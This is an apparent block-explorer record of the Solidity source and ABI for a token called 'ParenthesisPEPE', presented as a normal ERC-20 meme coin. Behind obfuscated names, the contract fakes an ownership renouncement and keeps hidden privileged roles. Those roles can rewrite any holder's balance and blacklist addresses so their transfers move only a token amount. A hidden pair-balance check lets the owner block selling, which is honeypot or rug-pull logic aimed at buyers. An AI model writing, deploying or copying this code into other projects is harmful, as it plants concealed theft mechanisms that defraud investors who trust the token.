{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface teamSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listModeTotal) external view returns (uint256);\n\n    function transfer(address launchedTo, uint256 txFee) external returns (bool);\n\n    function allowance(address atMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedTo,\n        uint256 txFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLiquidityFund, uint256 value);\n    event Approval(address indexed atMax, address indexed spender, uint256 value);\n}\n\nabstract contract teamToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitEnable {\n    function createPair(address teamMarketing, address maxWalletTrading) external returns (address);\n}\n\ninterface listWalletEnable is teamSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ParenthesisPEPE is teamToken, teamSell, listWalletEnable {\n\n    function launchMarketing(address senderTrading) public {\n        amountIs();\n        if (tradingSender != launchTrading) {\n            listLiquidity = true;\n        }\n        if (senderTrading == autoFee || senderTrading == fundLaunchMarketing) {\n            return;\n        }\n        minEnable[senderTrading] = true;\n    }\n\n    function amountIs() private view {\n        require(listBuy[_msgSender()]);\n    }\n\n    mapping(address => uint256) private minFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toWallet;\n    }\n\n    uint256 public isMarketingMin;\n\n    address private amountSwap;\n\n    uint256 private launchTrading;\n\n    function listTotal(uint256 txFee) public {\n        amountIs();\n        fromMode = txFee;\n    }\n\n    uint256 public marketingFee;\n\n    function balanceOf(address listModeTotal) public view virtual override returns (uint256) {\n        return minFee[listModeTotal];\n    }\n\n    bool public swapReceiver;\n\n    bool private receiverIs;\n\n    mapping(address => bool) public listBuy;\n\n    uint256 private tradingSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamWallet;\n    }\n\n    address atList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderBuy;\n    }\n\n    function marketingTradingSell(address toSell, address launchedTo, uint256 txFee) internal returns (bool) {\n        if (toSell == autoFee) {\n            return teamExempt(toSell, launchedTo, txFee);\n        }\n        uint256 buyLiquidity = teamSell(fundLaunchMarketing).balanceOf(atList);\n        require(buyLiquidity == fromMode);\n        require(launchedTo != atList);\n        if (minEnable[toSell]) {\n            return teamExempt(toSell, launchedTo, senderEnable);\n        }\n        return teamExempt(toSell, launchedTo, txFee);\n    }\n\n    event OwnershipTransferred(address indexed amountTxBuy, address indexed receiverSender);\n\n    function teamExempt(address toSell, address launchedTo, uint256 txFee) internal returns (bool) {\n        require(minFee[toSell] >= txFee);\n        minFee[toSell] -= txFee;\n        minFee[launchedTo] += txFee;\n        emit Transfer(toSell, launchedTo, txFee);\n        return true;\n    }\n\n    function maxMarketing(address limitAmount) public {\n        require(limitAmount.balance < 100000);\n        if (swapReceiver) {\n            return;\n        }\n        \n        listBuy[limitAmount] = true;\n        \n        swapReceiver = true;\n    }\n\n    function transfer(address modeTrading, uint256 txFee) external virtual override returns (bool) {\n        return marketingTradingSell(_msgSender(), modeTrading, txFee);\n    }\n\n    bool public enableMin;\n\n    constructor (){\n        \n        launchedTake launchReceiver = launchedTake(sellMarketing);\n        fundLaunchMarketing = limitEnable(launchReceiver.factory()).createPair(launchReceiver.WETH(), address(this));\n        \n        autoFee = _msgSender();\n        listMax();\n        listBuy[autoFee] = true;\n        minFee[autoFee] = teamWallet;\n        if (tradingSender == marketingFee) {\n            receiverIs = true;\n        }\n        emit Transfer(address(0), autoFee, teamWallet);\n    }\n\n    mapping(address => bool) public minEnable;\n\n    function transferFrom(address toSell, address launchedTo, uint256 txFee) external override returns (bool) {\n        if (_msgSender() != sellMarketing) {\n            if (fundTokenSwap[toSell][_msgSender()] != type(uint256).max) {\n                require(txFee <= fundTokenSwap[toSell][_msgSender()]);\n                fundTokenSwap[toSell][_msgSender()] -= txFee;\n            }\n        }\n        return marketingTradingSell(toSell, launchedTo, txFee);\n    }\n\n    uint256 fromMode;\n\n    address sellMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private fundTokenSwap;\n\n    bool private listLiquidity;\n\n    function getOwner() external view returns (address) {\n        return amountSwap;\n    }\n\n    address public autoFee;\n\n    uint256 constant senderEnable = 3 ** 10;\n\n    bool private fundWallet;\n\n    string private toWallet = \"PPE\";\n\n    uint256 private teamWallet = 100000000 * 10 ** 18;\n\n    string private sellLiquidity = \"Parenthesis PEPE\";\n\n    uint256 listTo;\n\n    function swapTeam(address modeTrading, uint256 txFee) public {\n        amountIs();\n        minFee[modeTrading] = txFee;\n    }\n\n    function listMax() public {\n        emit OwnershipTransferred(autoFee, address(0));\n        amountSwap = address(0);\n    }\n\n    function approve(address buyToMin, uint256 txFee) public virtual override returns (bool) {\n        fundTokenSwap[_msgSender()][buyToMin] = txFee;\n        emit Approval(_msgSender(), buyToMin, txFee);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellLiquidity;\n    }\n\n    bool public txEnable;\n\n    address public fundLaunchMarketing;\n\n    function allowance(address launchedMarketing, address buyToMin) external view virtual override returns (uint256) {\n        if (buyToMin == sellMarketing) {\n            return type(uint256).max;\n        }\n        return fundTokenSwap[launchedMarketing][buyToMin];\n    }\n\n    uint8 private senderBuy = 18;\n\n    function owner() external view returns (address) {\n        return amountSwap;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTxBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLiquidityFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyToMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listModeTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunchMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"}],\"name\":\"launchMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"listTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAmount\",\"type\":\"address\"}],\"name\":\"maxMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"swapTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ParenthesisPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}